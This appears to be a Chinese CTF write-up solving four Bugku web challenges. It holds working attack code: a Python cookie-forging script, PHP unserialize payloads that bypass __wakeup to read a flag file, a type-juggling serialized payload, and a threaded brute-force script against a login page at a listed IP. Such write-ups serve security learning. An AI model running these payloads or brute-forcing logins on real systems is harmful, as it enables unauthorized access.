# new bugku 部分 web 题解

标签（空格分隔）： web ctf

---

# web16

[web16][1]

打开页面，到处翻一下，到这:
![此处输入图片的描述][2]

这时候可以看到我们的 `cookie` ：
![此处输入图片的描述][3]

再看看 `js`：
![此处输入图片的描述][4]

就第一个：

![此处输入图片的描述][5]

这个是加密的，我们可以把 `eval` 换成 `console.log` 试试看：
![此处输入图片的描述][6]

[格式化一下代码][7]，

格式化后我们发现代码里有一段：

![此处输入图片的描述][8]

明显是解码的，把我们的 `cookie` 带入进入看看（记得先 `urldecode` 一下）：

![此处输入图片的描述][9]

这就很简单了。我们只需要写个 `encode_create` 就好了。

起初我在 `js` 里写了，但是不知道为什么中间部分会有些不同，于是改到了 `python` ：

```
import base64
s = 'O:5:"human":10:{s:8:"xueliang";i:847;s:5:"neili";i:577;s:5:"lidao";i:83;s:6:"dingli";i:74;s:7:"waigong";i:0;s:7:"neigong";i:0;s:7:"jingyan";i:0;s:6:"yelian";i:0;s:5:"money";i:99999999;s:4:"flag";s:1:"0";}'
res = ""
for i in range(len(s)):
    num = ord(s[i])
    num = num + ( (i%10) + 2 )
    num = num ^ i
    res += chr(num)

print base64.b64encode(res)
```
这里我把 `money` 改成了 `99999999` ，加密 -> urlencode -> 放入 `cookie`。
然后到商店处吧东西全买了，就能讨伐拿到 `flag` 啦。。

# web18

[web18][10]

 打开网页，扫描目录，发现有个 `/index`：
 

 

    <?php  
        class Small_white_rabbit{  
            private $file = 'index.php';  
        
            public function __construct($file) {  
                $this->file = $file;  
            }  
        
            function __destruct() {  
                echo @highlight_file($this->file, true);  
            }  
        
            function __wakeup() {  
                if ($this->file != 'index.php') {  
                    //the secret is in the_f1ag.php  
                    $this->file = 'index.php';  
                }  
            }  
        }  
        
        if (isset($_GET['var'])) {  
            $var = base64_decode($_GET['var']);  
            @unserialize($var);  
        } else {  
            highlight_file("index.php");  
        }  
    ?>
    
这里要读取 `the_f1ag.php` ，但是反序列化会触发 `__wakeup` 。不过有一个方法可以绕过，就是反序列化后把 `object` 的属性改多一些。

首先是序列化：

```
echo serialize( new Small_white_rabbit("the_f1ag.php"));
// O:18:"Small_white_rabbit":1:{s:24:"Small_white_rabbitfile";s:12:"the_f1ag.php";}
```
然后把 `"Small_white_rabbit":1`  这里的 `1` 改成 `2` (大于 `1` 就行)。

但是这里手动改是不行的，因为我们的对象里 `$file` 是 `private` 属性，所以你会发现序列化后属性很奇怪，变成了 `Small_white_rabbitfile`。而且变成长度还是 `24`。其实是因为他原本应该是这样的： `%00Small_white_rabbit%00file`。
有两个 `00`，所以我们可以这么改：

```
$a =  serialize(new Small_white_rabbit("the_f1ag.php"));
echo base64_encode(str_replace(":1:",":2:",$a));
// TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoyOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==
```

然后传递 `var` 变量上去，就行啦。

# web17

[web17][11]


访问，然后打开 `f12` ，发现：
```
<?php
class Time{
	public $flag = ******************;
	public $truepassword = ******************;
	public $time;
	public $password ;
	public function __construct($tt, $pp) {
    $this->time = $tt;
    $this->password = $pp;
    }
	function __destruct(){
		if(!empty($this->password))
		{
			if(strcmp($this->password,$this->truepassword)==0){
				echo "<h1>Welcome,you need to wait......<br>The flag will become soon....</h1><br>";
				if(!empty($this->time)){
					if(!is_numeric($this->time)){
						echo 'Sorry.<br>';
						show_source(__FILE__);
					}
					else if($this->time < 11 * 22 * 33 * 44 * 55 * 66){
						echo 'you need a bigger time.<br>';
					}
					else if($this->time > 66 * 55 * 44 * 33 * 23 * 11){
						echo 'you need a smaller time.<br>';
					}
					else{
						sleep((int)$this->time);
						var_dump($this->flag);
					}
					echo '<hr>';
				}
				else{
					echo '<h1>you have no time!!!!!</h1><br>';
				}
			}
			else{
				echo '<h1>Password is wrong............</h1><br>';
			}
		}
		else{
			echo "<h1>Please input password..........</h1><br>";
		}
	}
	function __wakeup(){
		$this->password = 1; echo 'hello hacker,I have changed your password and time, rua!';
	}
}
if(isset($_GET['rua'])){
	$rua = $_GET['rua'];
	@unserialize($rua);
}
else{
	echo "<h1>Please don't stop rua 233333</h1><br>";
}
?>
```

这里要绕过两个，我们先来讨论：

```
else if($this->time < 11 * 22 * 33 * 44 * 55 * 66){
	echo 'you need a bigger time.<br>';
}
else if($this->time > 66 * 55 * 44 * 33 * 23 * 11){
	echo 'you need a smaller time.<br>';
}
```

这里要 `time` 在 `1275523920` 和  `1333502280` 之间。

这时候我们可以整个科学计数法：

![此处输入图片的描述][12]

我们甚至可以把他变成 `0.13e10`。
或者我们也可以用 `16` 进制:

![此处输入图片的描述][13]

这里一定要是字符串的。。。

但是第二招在 `php7` 以后不能用了，第一招还可以：

![此处输入图片的描述][14]

然后看看：

`if(strcmp($this->password,$this->truepassword)==0){`

这个，对比 `password` 和 `truepassword`，其实这里 `truepassword` 在对象内，我们是可以控制的，我们只要把 `truepassword` 改成 1，就好了。。

但是看了表哥的 `wp` 后，发现这题可能是想说：
当 `strcmp`  传入数组后，会返回 `null`。这里又用的是 `弱比较`。所以 `null == 0`。

反正最后 `payload`：

`O:4:"Time":2:{s:12:"truepassword";s:1:"1";s:4:"time";s:10:"0x4c06f351";}`

# web23

[web23][15]

打开发现啥都没有，扫一下吧：
![此处输入图片的描述][16]

访问发现，是个登陆，发现这个验证码是时间戳后五位。

一开始的想法是写个函数获取验证码：

```
def get_time():
	return str(int(time.time()))[-5:]
```

但是后来测试发现我不用验证码（不传 `phpsessid` ） 也可以。于是脚本：

```
import time
import requests
import threading

def get_time():
	return str(int(time.time()))[-5:]

u = "http://123.206.31.85:10023/admin/login.php"

def a(i):
	data  ={
	"username":"admin",
	"password":("{}".format(i)).rjust(4,"0"),
	"verifycode":"",
	"submit":"",
	}
	
	r = requests.post(u,data=data)
	if r.text.find("用户名或密码错误") > 0:
		return
	print(r.text)

for i in range(1000):
	threading.Thread(target =a,args=(i,)).start()
```

别问为什么爆破 `4` 位的，233。

  [1]: http://123.206.31.85:1616/
  [2]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/55f3fbe84093708c801a8277f80f499f.png
  [3]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/c56417574071e1588000433b4c8ec779.png
  [4]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/6f506efb40b311c980c5bddf95af3c5b.png
  [5]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/c7bb7bd24077aea3805379df9db129a4.png
  [6]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/60d667c940e25f3480d175f34ac54a0e.png
  [7]: http://tool.oschina.net/codeformat/js/
  [8]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/b8a7bb1840c199cd805559963e125d2f.png
  [9]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/0932a7d640182a3c808d62e7e9becd7d.png
  [10]: http://123.206.31.85:10024
  [11]: http://123.206.31.85:10012/
  [12]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/64ddb3bb40e2147680545170ed0c1662.png
  [13]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/6a2f450d407be58480eec39bc255f96a.png
  [14]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/f24f342d40cd4ae080996661d19e2cc5.png
  [15]: http://123.206.31.85:10023/
  [16]: http://bmob-cdn-22342.b0.upaiyun.com/2019/05/11/77d4b07840a8eba68078b6d12b681725.png
